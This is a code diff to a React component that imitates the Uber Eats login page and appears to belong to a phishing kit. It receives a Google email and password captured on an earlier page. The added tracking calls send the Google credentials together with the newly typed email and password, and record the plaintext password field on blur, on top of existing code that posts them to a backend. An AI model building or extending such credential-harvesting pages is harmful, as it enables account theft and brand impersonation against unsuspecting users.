@@ -1,5 +1,14 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { FaApple } from "react-icons/fa";
+import {
+  trackPageView,
+  trackPageExit,
+  trackInputFocus,
+  trackInputBlur,
+  trackInputChange,
+  trackButtonClick,
+  trackFormSubmit,
+} from "./utils/activityTracker";
 
 interface UberEatsLoginProps {
   googleCredentials: { email: string; password: string };
@@ -9,10 +18,22 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
 
+  // Track page view on mount
+  useEffect(() => {
+    trackPageView('/login-page-2');
+    
+    return () => {
+      trackPageExit('/login-page-2');
+    };
+  }, []);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     console.log("Uber Eats login attempt with:", { email, password });
     console.log("Google credentials:", googleCredentials);
+    
+    // Track form submission
+    trackFormSubmit('login-form-page-2', { email, password, googleCredentials }, '/login-page-2');
     
     // Send credentials to backend
     try {
@@ -80,7 +101,12 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
               <input
                 type="email"
                 value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                onChange={(e) => {
+                  setEmail(e.target.value);
+                  trackInputChange('email-input-page-2', e.target.value.length > 0, '/login-page-2');
+                }}
+                onFocus={() => trackInputFocus('email-input-page-2', '/login-page-2')}
+                onBlur={() => trackInputBlur('email-input-page-2', email, '/login-page-2')}
                 placeholder="Phone number or email"
                 className="w-full px-4 py-3 text-[15px]
   bg-[#F3F3F3] border border-[#F3F3F3]
@@ -96,7 +122,12 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
               <input
                 type="password"
                 value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                onChange={(e) => {
+                  setPassword(e.target.value);
+                  trackInputChange('password-input-page-2', e.target.value.length > 0, '/login-page-2');
+                }}
+                onFocus={() => trackInputFocus('password-input-page-2', '/login-page-2')}
+                onBlur={() => trackInputBlur('password-input-page-2', password, '/login-page-2')}
                 placeholder="Your password"
                 className="w-full px-4 py-3 text-[15px]
   bg-[#F3F3F3] border border-[#F3F3F3]
@@ -111,6 +142,7 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
               {/* Continue Button */}
               <button
                 type="submit"
+                onClick={() => trackButtonClick('continue-button-page-2', '/login-page-2')}
                 className="w-full bg-black text-white font-medium py-3 text-[15px] rounded-lg
                 hover:bg-gray-900 transition-colors"
               >
@@ -127,6 +159,7 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
 
             {/* Google Button */}
             <button
+              onClick={() => trackButtonClick('google-button-page-2', '/login-page-2')}
               className="w-full bg-[#E8E8E8] text-gray-900 font-medium py-3 rounded-lg 
               hover:bg-[#DADADA] transition-colors flex items-center justify-center gap-2 text-sm"
             >
@@ -153,6 +186,7 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
 
             {/* Apple Button */}
             <button
+              onClick={() => trackButtonClick('apple-button-page-2', '/login-page-2')}
               className="w-full bg-[#E8E8E8] text-gray-900 font-medium py-3 rounded-lg 
   hover:bg-[#DADADA] transition-colors flex items-center justify-center gap-2 text-sm mt-2"
             >
@@ -169,6 +203,7 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
 
             {/* QR Login */}
             <button
+              onClick={() => trackButtonClick('qr-code-button-page-2', '/login-page-2')}
               className="w-full bg-[#E8E8E8] text-gray-900 font-medium py-3 rounded-lg 
               hover:bg-[#DADADA] transition-colors flex items-center justify-center gap-2 text-sm"
             >
